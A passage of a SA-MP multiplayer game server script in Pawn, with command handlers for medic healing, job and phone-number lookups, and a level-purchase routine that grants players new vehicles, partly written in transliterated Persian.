    PlayerPlaySound(playerid,1083,0,0,0);
    }
    new bizid = TooBiz[playerid];
    if((bizid == 51 || bizid == 52 || bizid == 53 || bizid == 74)&& IsACop(playerid))
    {
	    SetPlayerKhoon(true, playerid,100);
    	SetPlayerZereh(playerid,100);
	    PlayerPlaySound(playerid,1083,0,0,0);
    }
    if(PINFO[playerid][pMember] == 4||PINFO[playerid][pLeader] == 4)
    {
    tmp = strtok(cmdtext,idx);
    if(strlen(tmp))
    {
    errormessage[playerid] = 1;
    }
    else
    {
    errormessage[playerid] = 0;
    }
    new idtaraf = ReturnUser(tmp);
    tmp = strtok(cmdtext,idx);
    if(strlen(tmp))
    {
    errormessage2[playerid] = 1;
    }
    else
    {
    errormessage2[playerid] = 0;
    }
    new pool = strval(tmp);
    new car = GetPlayerVehicleID(playerid);
    if(IsAnAmbulance(car))
    {
    if(IsPlayerConnected(idtaraf) && GetPlayerVehicleID(idtaraf) == car)
    {
    if(pool > 0 && pool < 15)
    {
    if(idtaraf == playerid) return SCM(playerid,COLOR_ALI,"You cannot heal yourself.");
    new Float:Khooon;
    GetPlayerHealth(idtaraf,Khooon);
    if(Khooon >= 100) return SCM(playerid,COLOR_Good,"That player is fully healed.");
    SetPlayerKhoon(true, idtaraf,100);
    format(string,256,"~r~-$%d",pool);
    GameTextForPlayer(idtaraf, string, 5000, 1);
    new givename[MAX_PLAYER_NAME];
    GetPlayerName(idtaraf,givename,sizeof givename);
    GivePlayerPool(playerid,pool);
    format(string,256,"You have healed %s for $%d.",givename,pool);
    SCM(playerid,COLOR_Good,string);
    return 1;
    }
    else
    {
    if(errormessage[playerid] == 1 && errormessage2[playerid] == 1)
    {
    SCM(playerid,COLOR_Good,"Type a money between 1 and 14");
    }
    return 1;
    }
    }
    else
    {
    if(errormessage[playerid] == 1 && errormessage2[playerid] == 1)
    {
    SCM(playerid,COLOR_Good,"Player Not connected or that player isn't in you vehicle.");
    }
    return 1;
    }
    }
    else
    {
    if(errormessage[playerid] == 1 && errormessage2[playerid] == 1)
    {
    SCM(playerid,COLOR_Good,"You are not in a Ambulance or Medic Chopper.");
    }
    return 1;
    }
    }
    return 1;
    }


    //-------------------------------------
    if (strcmp(cmd, "/checkjob", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pLeader] >= 1 || PINFO[playerid][pRank] >= 6)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /checkjob [playerid/PartOfName]");
                    return 1;
                }
            giveplayerid = ReturnUser(tmp);
                new jtext[40];
                if(PlayerInfo[giveplayerid][pJob] == 1) { jtext = "Detective"; }
                else if(PlayerInfo[giveplayerid][pJob] == 2) { jtext = "Lawyer"; }
                else if(PlayerInfo[giveplayerid][pJob] == 4) { jtext = "Drugs Dealer"; }
                else if(PlayerInfo[giveplayerid][pJob] == 5) { jtext = "Car Jacker"; }
                else if(PlayerInfo[giveplayerid][pJob] == 7) { jtext = "Car Mechanic"; }
                else if(PlayerInfo[giveplayerid][pJob] == 9) { jtext = "Arms Dealer"; }
                else if(PlayerInfo[giveplayerid][pJob] == 14) { jtext = "Bus Driver"; }
                else if(PlayerInfo[giveplayerid][pJob] == 16) { jtext = "Trucker"; }
                else if(PlayerInfo[giveplayerid][pJob] == 18) { jtext = "Farmer"; }
                else if(PlayerInfo[giveplayerid][pJob] == 20) { jtext = "Garbage man"; }
                else { jtext = "Unemployed"; }

                    if(IsPlayerConnected(giveplayerid))
                    {
                    new sttr[128];
                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                format(sttr, sizeof(sttr), "%s's job is{FFFFFF} %s", giveplayer, jtext);
                        SCM(playerid, COLOR_YELLOW, sttr);
                        return 1;
                    }
                    else
                    {
                    SCM(playerid,COLOR_ALI,"Player not connected.");
                    return 1;
                    }
             }
             else {
             SCM(playerid,COLOR_YELLOW2,"Only leaders can use this command.");
             return 1;
             }
        }
        return 1;
    }


    //--------------------------------------------------------
		if (strcmp(cmd, "/number", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if (PlayerInfo[playerid][pPhoneBook] == 1)
				{
					tmp = strtok(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendMessage(playerid, COL_SYN, "Syntax: /Number <Playerid/PartOfName>");
						return 1;
					}
					//giveplayerid = strval(tmp);
					giveplayerid = ReturnUser(tmp);
					if(gPlayerLogged[giveplayerid] == 0 )
					{
						SendMessage(playerid, COLOR_GRAD1, "{57e547}Player Not Available");
						return 1;
					}
					if(IsPlayerConnected(giveplayerid))
					{
						if(giveplayerid != INVALID_PLAYER_ID)
						{
							new shomaretamas = PlayerInfo[giveplayerid][pPnumber];
							new sendernamex[512];
								GetPlayerName(playerid, sendernamex, sizeof(sendernamex));
								GetPlayerName(giveplayerid, sendername, sizeof(sendername));
								format(string, 256, "Name: %s, Ph: {FFFFFF}%s",sendername,FormatPhoneNumber(shomaretamas));
								SendMessage(playerid, COLOR_PURPLE, string);

						}
					}
					else
					{
						SendMessage(playerid, COLOR_GRAD1, "No Such Player !");
					}
				}
				else
				{
					SendMessage(playerid, COLOR_RED, "You do not have a PhoneBook.");
				}
			}
			return 1;
		}
//-------------------------------[LevelUp]--------------------------------------------------------------------------
    if(!strcmp(cmd,"/buylevel",true))
    {
        if(PlayerInfo[playerid][pLevel] >= 0)
        {
            new nxtlevel = PlayerInfo[playerid][pLevel]+1;
            new costlevel = nxtlevel*levelcost;
            new expamount = nxtlevel*levelexp;
            new infostring[256];
            if(GetPlayerPool(playerid) < costlevel)
            {
                format(infostring, 256, "Shoma $%s Niaz Darid.",FormatNumber(costlevel));
                return SendClientMessage(playerid, COLOR_Good, infostring);
            }
            new LevelBaghi = expamount - PlayerInfo[playerid][pExp];
            if (PlayerInfo[playerid][pExp] < expamount)
            {
                format(infostring, 256, "Shoma Be %d Respect Points Digar Niaz Darid.",LevelBaghi);
                return SendClientMessage(playerid, COLOR_YELLOW, infostring);
            }
            if(PlayerInfo[playerid][pLanguage] == 2) format(string, sizeof(string), "Congratulations, You are now level %d.", nxtlevel);
            else if(PlayerInfo[playerid][pLanguage] == 1) format(string, sizeof(string), "Level Shoma Be %d Afzaiesh Peida Kard. Ba Tashakor Az Inke {57e547}JoKeR GaminG {FFFFFF} Ra Baraye Bazi Entekhab Kardeid.", nxtlevel);
            SendClientMessage(playerid, COLOR_LIGHTRED, string);
			PINFO[playerid][pGold] +=10;
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            PlayerPlayMusic(playerid);
            GivePlayerPool(playerid, (-costlevel));
            PlayerInfo[playerid][pLevel]++;
            SaveKonVal(playerid, "pLevel", PINFO[playerid][pLevel]);
            new string3[128];
            format(string3, sizeof(string3), "~y~You are now level ~n~~r~%d", nxtlevel);

	    if(nxtlevel == 2) {

	    MashinOwner[PINFO[playerid][pCar]] = 9999;
            DestroyVehicle(PINFO[playerid][pCar], true);
            OwnedMashin[PINFO[playerid][pCar]] = 0;
            PINFO[playerid][pCar] = 0;
            SaveKonVal(playerid, "pCar", 0);
            PlayerInfo[playerid][cLocationx] = 0.0;
            SaveKonFloat(playerid, "cLocationx", 0);
            PlayerInfo[playerid][cLocationy] = 0.0;
            SaveKonFloat(playerid, "cLocationy", 0);
            PlayerInfo[playerid][cLocationz] = 0.0;
            SaveKonFloat(playerid, "cLocationz", 0);
            PlayerInfo[playerid][cAngle] = 0.0;
            SaveKonFloat(playerid, "cAngle", 0);
            PlayerInfo[playerid][cColor1] = 9999;
            SaveKonVal(playerid, "cColor1", 9999);
            PlayerInfo[playerid][cColor2] = 9999;
            SaveKonVal(playerid, "cColor2", 9999);
            PlayerInfo[playerid][cModel] = 0;
            SaveKonVal(playerid, "cModel", 0);
            PlayerInfo[playerid][cPrice] = 0;
            SaveKonVal(playerid, "cPrice", 0);
            strmid(PlayerInfo[playerid][cPlate], "New Veh", 0, strlen("New Veh"), 255);
            SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
            PlayerInfo[playerid][cLock] = 0;
            SaveKonVal(playerid, "cLock", 0);
            PlayerInfo[playerid][cDestroyed] = 0;
            SaveKonVal(playerid, "cDestroyed", 0);
            PINFO[playerid][cFixed] = 0;
            SaveKonVal(playerid, "cFixed", 0);
            PINFO[playerid][cInsurance] = 0;
            SaveKonVal(playerid, "cInsurance", 0);
            PlayerInfo[playerid][cFuel] = 0;
            SaveKonVal(playerid, "cFuel", 0);
            PlayerInfo[playerid][cHealth] = 0.0;
            SaveKonFloat(playerid, "cHealth", 0);
            PINFO[playerid][gLocationX] = 0;
            SaveKonFloat(playerid, "gLocationX", 0);
            PINFO[playerid][gLocationY] = 0;
            SaveKonFloat(playerid, "gLocationY", 0);
            PINFO[playerid][gLocationZ] = 0;
            SaveKonFloat(playerid, "gLocationZ", 0);
            PINFO[playerid][gAngle] = 0;
            SaveKonFloat(playerid, "gAngle", 0);
            PINFO[playerid][gParked] = 0;
            SaveKonVal(playerid, "gParked", 0);
            PlayerInfo[playerid][cMod1] = 0;
            SaveKonVal(playerid, "cMod1", 0);
            PlayerInfo[playerid][cMod3] = 0;
            SaveKonVal(playerid, "cMod3", 0);
            PlayerInfo[playerid][cMod4] = 0;
            SaveKonVal(playerid, "cMod4", 0);
            PlayerInfo[playerid][cMod5] = 0;
            SaveKonVal(playerid, "cMod5", 0);
            PlayerInfo[playerid][cMod6] = 0;
            SaveKonVal(playerid, "cMod6", 0);
            PlayerInfo[playerid][cMod7] = 0;
            SaveKonVal(playerid, "cMod7", 0);
            PlayerInfo[playerid][cMod8] = 0;
            SaveKonVal(playerid, "cMod8", 0);
            PlayerInfo[playerid][cMod9] = 0;
            SaveKonVal(playerid, "cMod9", 0);
            PlayerInfo[playerid][cMod10] = 0;
            SaveKonVal(playerid, "cMod10", 0);
            PlayerInfo[playerid][cMod11] = 0;
            SaveKonVal(playerid, "cMod11", 0);
            PlayerInfo[playerid][cMod12] = 0;
            SaveKonVal(playerid, "cMod12", 0);
            PlayerInfo[playerid][cMod13] = 0;
            SaveKonVal(playerid, "cMod13", 0);
            PlayerInfo[playerid][cMod14] = 0;
            SaveKonVal(playerid, "cMod14", 0);
            PlayerInfo[playerid][cMod15] = 0;
            SaveKonVal(playerid, "cMod15", 0);
            PlayerInfo[playerid][cMod16] = 0;
            SaveKonVal(playerid, "cMod16", 0);
            PlayerInfo[playerid][cMod17] = 0;
            SaveKonVal(playerid, "cMod17", 0);
            PlayerInfo[playerid][cPaintJob] = 3;
            SaveKonVal(playerid, "cPaintJob", 3);
            PlayerInfo[playerid][cKilo] = 0.0;
            SaveKonFloat(playerid, "cKilo", 0);
            PlayerInfo[playerid][cPanel] = 0;
            SaveKonVal(playerid, "cPanel", 0);
            PINFO[playerid][cDoors] = 0;
            SaveKonVal(playerid, "cDoors", 0);
            PINFO[playerid][cLights] = 0;
            SaveKonVal(playerid, "cLights", 0);
            PINFO[playerid][cTires] = 0;
            SaveKonVal(playerid, "cTires", 0);

	    	new rand;
		rand = random(sizeof(CarSpawn));
                new carid;


                carid = CreateVehicle(527, CarSpawn[rand][0], CarSpawn[rand][1], CarSpawn[rand][2], 89.143226, 1, 1,-1);

                PlayerInfo[playerid][pCar] = carid;
                SaveKonVal(playerid, "pCar", carid);
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;

                PlayerInfo[playerid][cLocationx] = CarSpawn[rand][0];
                SaveKonFloat(playerid, "cLocationx", CarSpawn[rand][0]);
                PlayerInfo[playerid][cLocationy] = CarSpawn[rand][1];
                SaveKonFloat(playerid, "cLocationy", CarSpawn[rand][1]);
                PlayerInfo[playerid][cLocationz] = CarSpawn[rand][2];
                SaveKonFloat(playerid, "cLocationz", CarSpawn[rand][2]);
                PlayerInfo[playerid][cAngle] = 89.143226;
                SaveKonFloat(playerid, "cAngle", 89.143226);
	        PlayerInfo[playerid][cModel] = 527;
                SaveKonVal(playerid, "cModel", 527);

		SendClientMessage(playerid, COLOR_YELLOW, "Be Monasebate Level 2 Server Be To Yek Cadrona dad.");
		SendClientMessage(playerid, COLOR_YELLOW, "Be Checkpoint darj Shode rooye map boro va tahvil begir");
                PlayerInfo[playerid][cLock] = 1;
                SaveKonVal(playerid, "cLock", 1);
                PlayerInfo[playerid][cFixed] = 1;
                SaveKonVal(playerid, "cFixed", 1);
                PlayerInfo[playerid][cFuel] = 100;
                SaveKonVal(playerid, "cFuel", 100);
                PlayerInfo[playerid][cHealth] = 1000.0;
                SaveKonFloat(playerid, "cHealth", 1000);
		new Float:x,Float:y,Float:z;
		new car = PlayerInfo[playerid][pCar];
		GetVehiclePos(car, x, y, z);
		OnCheckpoint[playerid] = 1;
		SetPlayerCheckpoint(playerid, x, y, z, 6);
		locatemashin[playerid] = 1;
                SetVehicleParamsEx(PlayerInfo[playerid][pCar], 0, 0, 0, 1, 0, 0, 0);
	    }
	    else if(nxtlevel == 3) {
	    MashinOwner[PINFO[playerid][pCar]] = 9999;
            DestroyVehicle(PINFO[playerid][pCar], true);
            OwnedMashin[PINFO[playerid][pCar]] = 0;
            PINFO[playerid][pCar] = 0;
            SaveKonVal(playerid, "pCar", 0);
            PlayerInfo[playerid][cLocationx] = 0.0;
            SaveKonFloat(playerid, "cLocationx", 0);
            PlayerInfo[playerid][cLocationy] = 0.0;
            SaveKonFloat(playerid, "cLocationy", 0);
            PlayerInfo[playerid][cLocationz] = 0.0;
            SaveKonFloat(playerid, "cLocationz", 0);
            PlayerInfo[playerid][cAngle] = 0.0;
            SaveKonFloat(playerid, "cAngle", 0);
            PlayerInfo[playerid][cColor1] = 9999;
            SaveKonVal(playerid, "cColor1", 9999);
            PlayerInfo[playerid][cColor2] = 9999;
            SaveKonVal(playerid, "cColor2", 9999);
            PlayerInfo[playerid][cModel] = 0;
            SaveKonVal(playerid, "cModel", 0);
            PlayerInfo[playerid][cPrice] = 0;
            SaveKonVal(playerid, "cPrice", 0);
            strmid(PlayerInfo[playerid][cPlate], "New Veh", 0, strlen("New Veh"), 255);
            SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
            PlayerInfo[playerid][cLock] = 0;
            SaveKonVal(playerid, "cLock", 0);
            PlayerInfo[playerid][cDestroyed] = 0;
            SaveKonVal(playerid, "cDestroyed", 0);
            PINFO[playerid][cFixed] = 0;
            SaveKonVal(playerid, "cFixed", 0);
            PINFO[playerid][cInsurance] = 0;
            SaveKonVal(playerid, "cInsurance", 0);
            PlayerInfo[playerid][cFuel] = 0;
            SaveKonVal(playerid, "cFuel", 0);
            PlayerInfo[playerid][cHealth] = 0.0;
            SaveKonFloat(playerid, "cHealth", 0);
            PINFO[playerid][gLocationX] = 0;
            SaveKonFloat(playerid, "gLocationX", 0);
            PINFO[playerid][gLocationY] = 0;
            SaveKonFloat(playerid, "gLocationY", 0);
            PINFO[playerid][gLocationZ] = 0;
            SaveKonFloat(playerid, "gLocationZ", 0);
            PINFO[playerid][gAngle] = 0;
            SaveKonFloat(playerid, "gAngle", 0);
            PINFO[playerid][gParked] = 0;
            SaveKonVal(playerid, "gParked", 0);
            PlayerInfo[playerid][cMod1] = 0;
            SaveKonVal(playerid, "cMod1", 0);
            PlayerInfo[playerid][cMod3] = 0;
            SaveKonVal(playerid, "cMod3", 0);
            PlayerInfo[playerid][cMod4] = 0;
            SaveKonVal(playerid, "cMod4", 0);
            PlayerInfo[playerid][cMod5] = 0;
            SaveKonVal(playerid, "cMod5", 0);
            PlayerInfo[playerid][cMod6] = 0;
            SaveKonVal(playerid, "cMod6", 0);
            PlayerInfo[playerid][cMod7] = 0;
            SaveKonVal(playerid, "cMod7", 0);
            PlayerInfo[playerid][cMod8] = 0;
            SaveKonVal(playerid, "cMod8", 0);
            PlayerInfo[playerid][cMod9] = 0;
            SaveKonVal(playerid, "cMod9", 0);
            PlayerInfo[playerid][cMod10] = 0;
            SaveKonVal(playerid, "cMod10", 0);
            PlayerInfo[playerid][cMod11] = 0;
            SaveKonVal(playerid, "cMod11", 0);
            PlayerInfo[playerid][cMod12] = 0;
            SaveKonVal(playerid, "cMod12", 0);
            PlayerInfo[playerid][cMod13] = 0;
            SaveKonVal(playerid, "cMod13", 0);
            PlayerInfo[playerid][cMod14] = 0;
            SaveKonVal(playerid, "cMod14", 0);
            PlayerInfo[playerid][cMod15] = 0;
            SaveKonVal(playerid, "cMod15", 0);
            PlayerInfo[playerid][cMod16] = 0;
            SaveKonVal(playerid, "cMod16", 0);
            PlayerInfo[playerid][cMod17] = 0;
            SaveKonVal(playerid, "cMod17", 0);
            PlayerInfo[playerid][cPaintJob] = 3;
            SaveKonVal(playerid, "cPaintJob", 3);
            PlayerInfo[playerid][cKilo] = 0.0;
            SaveKonFloat(playerid, "cKilo", 0);
            PlayerInfo[playerid][cPanel] = 0;
            SaveKonVal(playerid, "cPanel", 0);
            PINFO[playerid][cDoors] = 0;
            SaveKonVal(playerid, "cDoors", 0);
            PINFO[playerid][cLights] = 0;
            SaveKonVal(playerid, "cLights", 0);
            PINFO[playerid][cTires] = 0;
            SaveKonVal(playerid, "cTires", 0);
	    new rand;
		rand = random(sizeof(CarSpawn));
                new carid;


                carid = CreateVehicle(549, CarSpawn[rand][0], CarSpawn[rand][1], CarSpawn[rand][2], 89.143226, 1, 1,-1);

                PlayerInfo[playerid][pCar] = carid;
                SaveKonVal(playerid, "pCar", carid);
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;

                PlayerInfo[playerid][cLocationx] = CarSpawn[rand][0];
                SaveKonFloat(playerid, "cLocationx", CarSpawn[rand][0]);
                PlayerInfo[playerid][cLocationy] = CarSpawn[rand][1];
                SaveKonFloat(playerid, "cLocationy", CarSpawn[rand][1]);
                PlayerInfo[playerid][cLocationz] = CarSpawn[rand][2];
                SaveKonFloat(playerid, "cLocationz", CarSpawn[rand][2]);
                PlayerInfo[playerid][cAngle] = 89.143226;
                SaveKonFloat(playerid, "cAngle", 89.143226);
	        PlayerInfo[playerid][cModel] = 549;
                SaveKonVal(playerid, "cModel", 549);
		SendClientMessage(playerid, COLOR_YELLOW, "Be Monasebate Level 3 Server Be To Yek Tampa dad.");
		SendClientMessage(playerid, COLOR_YELLOW, "Be Checkpoint darj Shode rooye map boro va tahvil begir");
                PlayerInfo[playerid][cLock] = 1;
                SaveKonVal(playerid, "cLock", 1);
                PlayerInfo[playerid][cFixed] = 1;
                SaveKonVal(playerid, "cFixed", 1);
                PlayerInfo[playerid][cFuel] = 100;
                SaveKonVal(playerid, "cFuel", 100);
                PlayerInfo[playerid][cHealth] = 1000.0;
                SaveKonFloat(playerid, "cHealth", 1000);
		new Float:x,Float:y,Float:z;
		new car = PlayerInfo[playerid][pCar];
		GetVehiclePos(car, x, y, z);
		OnCheckpoint[playerid] = 1;
		SetPlayerCheckpoint(playerid, x, y, z, 6);
		locatemashin[playerid] = 1;
                SetVehicleParamsEx(PlayerInfo[playerid][pCar], 0, 0, 0, 1, 0, 0, 0);
	    }
	    else if(nxtlevel == 4) {
	    MashinOwner[PINFO[playerid][pCar]] = 9999;
            DestroyVehicle(PINFO[playerid][pCar], true);
            OwnedMashin[PINFO[playerid][pCar]] = 0;
            PINFO[playerid][pCar] = 0;
            SaveKonVal(playerid, "pCar", 0);
            PlayerInfo[playerid][cLocationx] = 0.0;
            SaveKonFloat(playerid, "cLocationx", 0);
            PlayerInfo[playerid][cLocationy] = 0.0;
            SaveKonFloat(playerid, "cLocationy", 0);
            PlayerInfo[playerid][cLocationz] = 0.0;
            SaveKonFloat(playerid, "cLocationz", 0);
            PlayerInfo[playerid][cAngle] = 0.0;
            SaveKonFloat(playerid, "cAngle", 0);
            PlayerInfo[playerid][cColor1] = 9999;
            SaveKonVal(playerid, "cColor1", 9999);
            PlayerInfo[playerid][cColor2] = 9999;
            SaveKonVal(playerid, "cColor2", 9999);
            PlayerInfo[playerid][cModel] = 0;
            SaveKonVal(playerid, "cModel", 0);
            PlayerInfo[playerid][cPrice] = 0;
            SaveKonVal(playerid, "cPrice", 0);
            strmid(PlayerInfo[playerid][cPlate], "New Veh", 0, strlen("New Veh"), 255);
            SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
            PlayerInfo[playerid][cLock] = 0;
            SaveKonVal(playerid, "cLock", 0);
            PlayerInfo[playerid][cDestroyed] = 0;
            SaveKonVal(playerid, "cDestroyed", 0);
            PINFO[playerid][cFixed] = 0;
            SaveKonVal(playerid, "cFixed", 0);
            PINFO[playerid][cInsurance] = 0;
            SaveKonVal(playerid, "cInsurance", 0);
            PlayerInfo[playerid][cFuel] = 0;
            SaveKonVal(playerid, "cFuel", 0);
            PlayerInfo[playerid][cHealth] = 0.0;
            SaveKonFloat(playerid, "cHealth", 0);
            PINFO[playerid][gLocationX] = 0;
            SaveKonFloat(playerid, "gLocationX", 0);
            PINFO[playerid][gLocationY] = 0;
            SaveKonFloat(playerid, "gLocationY", 0);
            PINFO[playerid][gLocationZ] = 0;
            SaveKonFloat(playerid, "gLocationZ", 0);
            PINFO[playerid][gAngle] = 0;
            SaveKonFloat(playerid, "gAngle", 0);
            PINFO[playerid][gParked] = 0;
            SaveKonVal(playerid, "gParked", 0);
            PlayerInfo[playerid][cMod1] = 0;
            SaveKonVal(playerid, "cMod1", 0);
            PlayerInfo[playerid][cMod3] = 0;
            SaveKonVal(playerid, "cMod3", 0);
            PlayerInfo[playerid][cMod4] = 0;
            SaveKonVal(playerid, "cMod4", 0);
            PlayerInfo[playerid][cMod5] = 0;
            SaveKonVal(playerid, "cMod5", 0);
            PlayerInfo[playerid][cMod6] = 0;
            SaveKonVal(playerid, "cMod6", 0);
            PlayerInfo[playerid][cMod7] = 0;
            SaveKonVal(playerid, "cMod7", 0);
            PlayerInfo[playerid][cMod8] = 0;
            SaveKonVal(playerid, "cMod8", 0);
            PlayerInfo[playerid][cMod9] = 0;
            SaveKonVal(playerid, "cMod9", 0);
            PlayerInfo[playerid][cMod10] = 0;
            SaveKonVal(playerid, "cMod10", 0);
            PlayerInfo[playerid][cMod11] = 0;
            SaveKonVal(playerid, "cMod11", 0);
            PlayerInfo[playerid][cMod12] = 0;
            SaveKonVal(playerid, "cMod12", 0);
            PlayerInfo[playerid][cMod13] = 0;
            SaveKonVal(playerid, "cMod13", 0);
            PlayerInfo[playerid][cMod14] = 0;
            SaveKonVal(playerid, "cMod14", 0);
            PlayerInfo[playerid][cMod15] = 0;
            SaveKonVal(playerid, "cMod15", 0);
            PlayerInfo[playerid][cMod16] = 0;
            SaveKonVal(playerid, "cMod16", 0);
            PlayerInfo[playerid][cMod17] = 0;
            SaveKonVal(playerid, "cMod17", 0);
            PlayerInfo[playerid][cPaintJob] = 3;
            SaveKonVal(playerid, "cPaintJob", 3);
            PlayerInfo[playerid][cKilo] = 0.0;
            SaveKonFloat(playerid, "cKilo", 0);
            PlayerInfo[playerid][cPanel] = 0;
            SaveKonVal(playerid, "cPanel", 0);
            PINFO[playerid][cDoors] = 0;
            SaveKonVal(playerid, "cDoors", 0);
            PINFO[playerid][cLights] = 0;
            SaveKonVal(playerid, "cLights", 0);
            PINFO[playerid][cTires] = 0;
            SaveKonVal(playerid, "cTires", 0);
		new rand;
		rand = random(sizeof(CarSpawn));
                new carid;


                carid = CreateVehicle(422, CarSpawn[rand][0], CarSpawn[rand][1], CarSpawn[rand][2], 89.143226, 1, 1,-1);

                PlayerInfo[playerid][pCar] = carid;
                SaveKonVal(playerid, "pCar", carid);
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;

                PlayerInfo[playerid][cLocationx] = CarSpawn[rand][0];
                SaveKonFloat(playerid, "cLocationx", CarSpawn[rand][0]);
                PlayerInfo[playerid][cLocationy] = CarSpawn[rand][1];
                SaveKonFloat(playerid, "cLocationy", CarSpawn[rand][1]);
                PlayerInfo[playerid][cLocationz] = CarSpawn[rand][2];
                SaveKonFloat(playerid, "cLocationz", CarSpawn[rand][2]);
                PlayerInfo[playerid][cAngle] = 89.143226;
                SaveKonFloat(playerid, "cAngle", 89.143226);

	        PlayerInfo[playerid][cModel] = 422;
                SaveKonVal(playerid, "cModel", 422);
		SendClientMessage(playerid, COLOR_YELLOW, "Be Monasebate Level 4 Server Be To Yek Bobcar dad.");
		SendClientMessage(playerid, COLOR_YELLOW, "Be Checkpoint darj Shode rooye map boro va tahvil begir");
                PlayerInfo[playerid][cLock] = 1;
                SaveKonVal(playerid, "cLock", 1);
                PlayerInfo[playerid][cFixed] = 1;
                SaveKonVal(playerid, "cFixed", 1);
                PlayerInfo[playerid][cFuel] = 100;
                SaveKonVal(playerid, "cFuel", 100);
                PlayerInfo[playerid][cHealth] = 1000.0;
                SaveKonFloat(playerid, "cHealth", 1000);
		new Float:x,Float:y,Float:z;
		new car = PlayerInfo[playerid][pCar];
		GetVehiclePos(car, x, y, z);
		OnCheckpoint[playerid] = 1;
		SetPlayerCheckpoint(playerid, x, y, z, 6);
		locatemashin[playerid] = 1;
                SetVehicleParamsEx(PlayerInfo[playerid][pCar], 0, 0, 0, 1, 0, 0, 0);
	    }
	    else if(nxtlevel == 5) {
	    MashinOwner[PINFO[playerid][pCar]] = 9999;
            DestroyVehicle(PINFO[playerid][pCar], true);
            OwnedMashin[PINFO[playerid][pCar]] = 0;
            PINFO[playerid][pCar] = 0;
            SaveKonVal(playerid, "pCar", 0);
            PlayerInfo[playerid][cLocationx] = 0.0;
            SaveKonFloat(playerid, "cLocationx", 0);
            PlayerInfo[playerid][cLocationy] = 0.0;
            SaveKonFloat(playerid, "cLocationy", 0);
            PlayerInfo[playerid][cLocationz] = 0.0;
            SaveKonFloat(playerid, "cLocationz", 0);
            PlayerInfo[playerid][cAngle] = 0.0;
            SaveKonFloat(playerid, "cAngle", 0);
            PlayerInfo[playerid][cColor1] = 9999;
            SaveKonVal(playerid, "cColor1", 9999);
            PlayerInfo[playerid][cColor2] = 9999;
            SaveKonVal(playerid, "cColor2", 9999);
            PlayerInfo[playerid][cModel] = 0;
            SaveKonVal(playerid, "cModel", 0);
            PlayerInfo[playerid][cPrice] = 0;
            SaveKonVal(playerid, "cPrice", 0);
            strmid(PlayerInfo[playerid][cPlate], "New Veh", 0, strlen("New Veh"), 255);
            SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
            PlayerInfo[playerid][cLock] = 0;
            SaveKonVal(playerid, "cLock", 0);
            PlayerInfo[playerid][cDestroyed] = 0;
            SaveKonVal(playerid, "cDestroyed", 0);
            PINFO[playerid][cFixed] = 0;
            SaveKonVal(playerid, "cFixed", 0);
            PINFO[playerid][cInsurance] = 0;
            SaveKonVal(playerid, "cInsurance", 0);
            PlayerInfo[playerid][cFuel] = 0;
            SaveKonVal(playerid, "cFuel", 0);
            PlayerInfo[playerid][cHealth] = 0.0;
            SaveKonFloat(playerid, "cHealth", 0);
            PINFO[playerid][gLocationX] = 0;
            SaveKonFloat(playerid, "gLocationX", 0);
            PINFO[playerid][gLocationY] = 0;
            SaveKonFloat(playerid, "gLocationY", 0);
            PINFO[playerid][gLocationZ] = 0;
            SaveKonFloat(playerid, "gLocationZ", 0);
            PINFO[playerid][gAngle] = 0;
            SaveKonFloat(playerid, "gAngle", 0);
            PINFO[playerid][gParked] = 0;
            SaveKonVal(playerid, "gParked", 0);
            PlayerInfo[playerid][cMod1] = 0;
            SaveKonVal(playerid, "cMod1", 0);
            PlayerInfo[playerid][cMod3] = 0;
            SaveKonVal(playerid, "cMod3", 0);
            PlayerInfo[playerid][cMod4] = 0;
            SaveKonVal(playerid, "cMod4", 0);
            PlayerInfo[playerid][cMod5] = 0;
            SaveKonVal(playerid, "cMod5", 0);
            PlayerInfo[playerid][cMod6] = 0;
            SaveKonVal(playerid, "cMod6", 0);
            PlayerInfo[playerid][cMod7] = 0;
            SaveKonVal(playerid, "cMod7", 0);
            PlayerInfo[playerid][cMod8] = 0;
            SaveKonVal(playerid, "cMod8", 0);
            PlayerInfo[playerid][cMod9] = 0;
            SaveKonVal(playerid, "cMod9", 0);
            PlayerInfo[playerid][cMod10] = 0;
            SaveKonVal(playerid, "cMod10", 0);
            PlayerInfo[playerid][cMod11] = 0;
            SaveKonVal(playerid, "cMod11", 0);
            PlayerInfo[playerid][cMod12] = 0;
            SaveKonVal(playerid, "cMod12", 0);
            PlayerInfo[playerid][cMod13] = 0;
            SaveKonVal(playerid, "cMod13", 0);
            PlayerInfo[playerid][cMod14] = 0;
            SaveKonVal(playerid, "cMod14", 0);
            PlayerInfo[playerid][cMod15] = 0;
            SaveKonVal(playerid, "cMod15", 0);
            PlayerInfo[playerid][cMod16] = 0;
            SaveKonVal(playerid, "cMod16", 0);
            PlayerInfo[playerid][cMod17] = 0;
            SaveKonVal(playerid, "cMod17", 0);
            PlayerInfo[playerid][cPaintJob] = 3;
            SaveKonVal(playerid, "cPaintJob", 3);
            PlayerInfo[playerid][cKilo] = 0.0;
            SaveKonFloat(playerid, "cKilo", 0);
            PlayerInfo[playerid][cPanel] = 0;
            SaveKonVal(playerid, "cPanel", 0);
            PINFO[playerid][cDoors] = 0;
            SaveKonVal(playerid, "cDoors", 0);
            PINFO[playerid][cLights] = 0;
            SaveKonVal(playerid, "cLights", 0);
            PINFO[playerid][cTires] = 0;
            SaveKonVal(playerid, "cTires", 0);
		new rand;
		rand = random(sizeof(CarSpawn));
                new carid;


                carid = CreateVehicle(481, CarSpawn[rand][0], CarSpawn[rand][1], CarSpawn[rand][2], 89.143226, 1, 1,-1);

                PlayerInfo[playerid][pCar] = carid;
                SaveKonVal(playerid, "pCar", carid);
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;

                PlayerInfo[playerid][cLocationx] = CarSpawn[rand][0];
